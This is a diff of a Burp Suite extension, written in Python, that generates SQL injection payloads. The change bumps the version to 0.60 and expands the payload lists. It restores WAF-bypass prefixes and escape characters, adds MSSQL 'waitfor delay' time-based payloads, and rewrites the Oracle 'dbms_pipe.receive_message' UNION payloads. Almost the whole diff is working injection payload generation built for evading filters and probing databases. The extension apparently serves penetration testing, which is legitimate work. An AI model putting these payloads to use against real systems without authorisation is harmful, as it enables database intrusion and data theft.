@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.59"
+VERSION = "0.60"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -416,20 +416,15 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 return
 
         listSQLi = []
-        #prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
         prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
-        prefixes = [""]
         
         escapeChars = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
-        escapeChars = ["", "'"]
-        
-        #boolExpressions = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
+
         n1 = str(random.randint(10,70))
         n2 = str(random.randint(71,99))
         boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
         
-        #suffixes = ["", " -- ", "; -- "]
-        suffixes = ["", "; -- "]
+        suffixes = ["", " -- ", "; -- "]
         
         if not self._cbSqlWafBypass.isSelected():
             prefixes = [""]
@@ -492,6 +487,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                     listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                     if not escapeChar:
                                         listSQLi.append(prefix + unionPhrase + "\n")
+                                    if self._cbTimeBased.isSelected():
+                                        if escapeChar:
+                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
+                                        else:
+                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:20'" + "\n")
                                 if self._cbOracleBased.isSelected():
                                     listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                     if not escapeChar:
@@ -500,19 +500,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                         if escapeChar:
                                             listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)") + " from dual" + suffix + "\n")                                            
                                             listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
-                                            
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) AS VARCHAR2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message(1,1000) AS VARCHAR2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
                                         else:
                                             listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + suffix + "\n")
                                             listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + "\n")
                                             listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
                                             listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + "\n")
-
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message(('a'),1000) AS VARCHAR2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message(('a'),1000) AS VARCHAR2(10))") + " from dual" + "\n")                                    
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message(1,1000) AS VARCHAR2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "CAST(dbms_pipe.receive_message(1,1000) AS VARCHAR2(10))") + " from dual" + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + "\n")                                    
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + "\n")
                                 unionPhrase += ","
 
         for prefix in prefixes:
